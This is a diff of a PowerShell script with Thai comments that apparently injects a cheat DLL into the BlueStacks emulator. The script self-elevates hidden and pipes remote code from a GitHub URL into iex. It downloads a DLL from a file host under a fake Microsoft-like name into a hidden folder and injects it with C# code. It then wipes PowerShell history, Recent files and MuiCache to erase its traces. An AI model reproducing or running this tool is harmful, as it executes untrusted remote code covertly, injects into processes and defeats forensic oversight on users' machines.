@@ -1,5 +1,5 @@
 # =========================================================
-# 1. ขอสิทธิ์ Administrator (แบบ Stealth)
+# 1. ขอสิทธิ์ Administrator (แบบซ่อนหน้าต่าง)
 # =========================================================
 if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
     Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"iex ((iwr 'https://github.com/potae112/Cmdfreefire/blob/main/dugduy.ps1' -UseBasicParsing).Content)`"" -Verb RunAs
@@ -7,32 +7,29 @@ if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]:
 }
 
 # =========================================================
-# 2. ตั้งค่าไฟล์และการพรางตัว (ใช้การสุ่มชื่อเพื่อเลี่ยง File In Use)
+# 2. ตั้งค่าไฟล์และการพรางตัว
 # =========================================================
 $url = "https://files.catbox.moe/0ukxya.dll" 
-$randomId = Get-Random -Minimum 100 -Maximum 999
-$fakeName = "mscore_$randomId.dll" # สุ่มชื่อไฟล์เพื่อไม่ให้ซ้ำกับของเดิมที่โดนล็อก
+$fakeName = "mscories.dll" 
 $workDir = "$env:LOCALAPPDATA\Microsoft\CLR_v4.0"
 $dllPath = Join-Path $workDir $fakeName
 $targetProcess = "HD-Player" 
 
 # =========================================================
-# 3. เตรียมที่เก็บไฟล์ (ข้ามการลบถ้าลบไม่ได้ เพื่อไม่ให้ขึ้นตัวแดง)
+# 3. เตรียมที่เก็บไฟล์ (ซ่อนโฟลเดอร์ระบบ)
 # =========================================================
-if (!(Test-Path $workDir)) {
-    New-Item -ItemType Directory -Path $workDir -Force | Out-Null
-}
+if (Test-Path $workDir) { Remove-Item $workDir -Recurse -Force -Confirm:$false -ErrorAction SilentlyContinue }
+New-Item -ItemType Directory -Path $workDir -Force | Out-Null
 attrib +h +s $workDir
 
 # =========================================================
-# 4. ดาวน์โหลด DLL (ใช้พารามิเตอร์เงียบที่สุด)
+# 4. ดาวน์โหลด DLL (ปิดแถบสถานะการโหลด)
 # =========================================================
 $ProgressPreference = 'SilentlyContinue'
-# โหลดไฟล์ใหม่ด้วยชื่อที่สุ่มมา (จะไม่ติดสีแดงแน่นอนเพราะชื่อไม่ซ้ำ)
-Invoke-WebRequest -Uri $url -OutFile $dllPath -UseBasicParsing -ErrorAction SilentlyContinue
+Invoke-WebRequest -Uri $url -OutFile $dllPath -UseBasicParsing
 
 # =========================================================
-# 5. C# Injector Code
+# 5. C# Injector Code (Internal Method)
 # =========================================================
 $Source = @"
 using System;
@@ -66,45 +63,52 @@ public class Injector {
 "@
 
 # =========================================================
-# 6. ตรวจสอบและ Inject (ไม่สั่งปิดโปรแกรม)
+# 6. เริ่มการ Inject เข้า BlueStacks
 # =========================================================
-$proc = Get-Process -Name $targetProcess -ErrorAction SilentlyContinue
-if ($proc -and (Test-Path $dllPath)) {
-    Add-Type -TypeDefinition $Source -ErrorAction SilentlyContinue
-    [Injector]::Inject($proc.Id, $dllPath)
-}
+if (Test-Path $dllPath) {
+    $proc = Get-Process -Name $targetProcess -ErrorAction SilentlyContinue
+    if (!$proc) {
+        if (Test-Path "C:\Program Files\BlueStacks_nxt\HD-Player.exe") {
+            Start-Process "C:\Program Files\BlueStacks_nxt\HD-Player.exe"
+            Start-Sleep -Seconds 8 
+            $proc = Get-Process -Name $targetProcess -ErrorAction SilentlyContinue
+        }
+    }
 
-# =========================================================
-# 7. --- The Ghost Clean (บังคับ Yes All ทุกจุด) ---
-# =========================================================
-Start-Sleep -Seconds 2
-
-# ล้างประวัติ PowerShell
-Clear-History
-$historyPath = (Get-PSReadLineOption).HistorySavePath
-if (Test-Path $historyPath) { Remove-Item $historyPath -Force -Confirm:$false -ErrorAction SilentlyContinue }
-
-# ล้าง Recent / AutomaticDestinations (ใส่ -Recurse และ -Confirm:$false เพื่อ Yes All)
-$recentPaths = @(
-    "$env:APPDATA\Microsoft\Windows\Recent",
-    "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations",
-    "$env:APPDATA\Microsoft\Windows\Recent\CustomDestinations"
-)
-
-foreach ($path in $recentPaths) {
-    if (Test-Path $path) {
-        # บังคับลบไฟล์ข้างในทั้งหมดแบบไม่ต้องถามยืนยัน
-        Remove-Item -Path "$path\*" -Recurse -Force -Confirm:$false -ErrorAction SilentlyContinue
+    if ($proc) {
+        Add-Type -TypeDefinition $Source
+        [Injector]::Inject($proc.Id, $dllPath)
     }
 }
 
-# ล้าง MuiCache (ลบชื่อไฟล์ที่สุ่มขึ้นมาทิ้ง)
+# =========================================================
+# 7. --- The Ghost Clean (ลบร่องรอยแบบ Auto-Confirm) ---
+# =========================================================
+Start-Sleep -Seconds 5
+
+# ลบไฟล์และโฟลเดอร์หลัก
+Remove-Item $workDir -Recurse -Force -Confirm:$false -ErrorAction SilentlyContinue
+
+# ล้าง PowerShell History ทุกอย่าง
+Clear-History
+$historyPath = (Get-PSReadLineOption).HistorySavePath
+if (Test-Path $historyPath) { 
+    Remove-Item $historyPath -Force -Confirm:$false -ErrorAction SilentlyContinue 
+}
+
+# ล้าง Recent Files และ JumpLists (แก้ปัญหาโดนถาม Confirm)
+$recent = "$env:APPDATA\Microsoft\Windows\Recent"
+if (Test-Path $recent) {
+    Get-ChildItem -Path $recent -Recit -Recurse -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse -Confirm:$false -ErrorAction SilentlyContinue
+}
+
+# ล้าง MuiCache (ร่องรอยชื่อไฟล์ในระบบ)
 $muiPath = "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache"
-Get-ItemProperty -Path $muiPath -ErrorAction SilentlyContinue | Get-Member -MemberType NoteProperty | Where-Object { $_.Name -like "*mscore_*" -or $_.Name -like "*powershell*" } | ForEach-Object {
+Get-ItemProperty -Path $muiPath -ErrorAction SilentlyContinue | Get-Member -MemberType NoteProperty | Where-Object { $_.Name -like "*$fakeName*" -or $_.Name -like "*powershell*" } | ForEach-Object {
     Remove-ItemProperty -Path $muiPath -Name $_.Name -Force -Confirm:$false -ErrorAction SilentlyContinue
 }
 
-# รีสตาร์ท Explorer (ทำงานใน Background)
+# รีสตาร์ท Explorer แบบเนียน (รันใน Background Job เพื่อให้สคริปต์ปิดตัวได้ทันที)
 Start-Job -ScriptBlock {
     Stop-Process -Name explorer -Force
     Start-Sleep -Seconds 1
